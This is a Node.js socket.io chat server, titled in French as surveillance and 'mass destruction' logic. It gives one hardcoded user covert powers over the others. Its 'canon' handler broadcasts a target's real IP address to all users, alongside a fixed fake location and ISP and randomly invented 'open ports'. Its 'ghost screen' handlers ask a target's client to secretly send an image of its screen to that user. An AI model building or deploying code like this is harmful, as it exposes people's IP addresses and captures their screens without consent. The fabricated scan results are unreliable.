/**
 * NEBULA V39 - CANON-OS
 * LOGIQUE DE SURVEILLANCE ET DESTRUCTION MASSIVE
 */

const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const PORT = 3000;

let registry = { users: {}, blacklist: new Set() };

io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;

    socket.on('init_user', (data) => {
        if (registry.blacklist.has(ip)) return socket.disconnect();
        registry.users[socket.id] = {
            id: socket.id,
            name: data.name,
            ip: ip,
            chef: data.name === "toucheur2pp"
        };
        sync();
    });

    // --- LE CANON & RÉVÉLATION ---
    socket.on('fire_canon', (targetSid) => {
        const chef = registry.users[socket.id];
        const target = registry.users[targetSid];
        if (!chef?.chef || !target) return;

        const attackData = {
            target: target.name,
            ip: target.ip,
            loc: "PARIS, FR (PROXY DETECTED)",
            fai: "ORANGE INFRASTRUCTURE",
            ports: [22, 80, 443, 8080, 554, 3000].filter(() => Math.random() > 0.4)
        };

        io.emit('canon_animation', { from: socket.id, to: targetSid });
        io.emit('chat_msg', { 
            system: true, 
            text: `[CANON_FIRE] ➔ TARGET: ${attackData.target} | IP: ${attackData.ip} | PORTS: ${attackData.ports.join(',')}` 
        });

        io.to(targetSid).emit('system_destruction', chef.name);
    });

    // --- GHOST SCREEN (ESPIONNAGE) ---
    socket.on('request_ghost_screen', (targetSid) => {
        if (!registry.users[socket.id]?.chef) return;
        // On demande à la cible d'envoyer son "écran" (canvas) secrètement
        io.to(targetSid).emit('capture_signal', socket.id);
    });

    socket.on('screen_data_transfer', (data) => {
        // Envoi du snapshot au chef
        io.to(data.to).emit('view_ghost_screen', { from: socket.id, img: data.img });
    });

    socket.on('disconnect', () => { delete registry.users[socket.id]; sync(); });

    function sync() { io.emit('sync_users', Object.values(registry.users)); }
});

http.listen(PORT, () => console.log("CANON-OS V39 READY"));
